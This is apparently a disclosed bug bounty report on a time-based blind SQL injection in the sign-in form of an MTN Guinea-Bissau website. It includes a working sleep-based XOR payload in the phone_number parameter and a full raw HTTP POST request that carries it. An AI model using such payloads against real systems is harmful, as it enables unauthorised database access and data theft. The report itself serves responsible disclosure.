# Blind SQL Injection 

## Report Details
- **Report ID**: 1069531
- **URL**: https://hackerone.com/reports/1069531
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2021-01-01T04:16:30.256Z
- **Disclosed**: 2021-08-14T18:34:29.431Z

## Reporter
- **Username**: lu3ky-13
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mtn_group

## Vulnerability Information
hello dear support

I have found Blind SQL Injection on https://futexpert.mtngbissau.com/signin/
parameters injectable phone_number=0&pin=1&submit=Continuar via post
URL:https://futexpert.mtngbissau.com/signin/
Post: email=0
my payload : phone_number=0'XOR(if(now()=sysdate()%2Csleep(0)%2C0))XOR'Z&pin=1&submit=Continuar

HTTP request
==========
```
POST /signin/ HTTP/1.1
Host: futexpert.mtngbissau.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Origin: https://futexpert.mtngbissau.com
Connection: close
Referer: https://futexpert.mtngbissau.com/signin/
Cookie: _ga=GA1.2.807090149.1609258213; _gid=GA1.2.432006610.1609466934; PHPSESSID=87pejs8h0usb0ill37hit63an5
Upgrade-Insecure-Requests: 1

phone_number=0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%2812%29%2C0%29%29XOR%27Z+%3D%3E&pin=1&submit=Continuar

```

if you need more info I'm here thank you

## Impact

An attacker can use SQL injection it to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.

## Attachments
No attachments
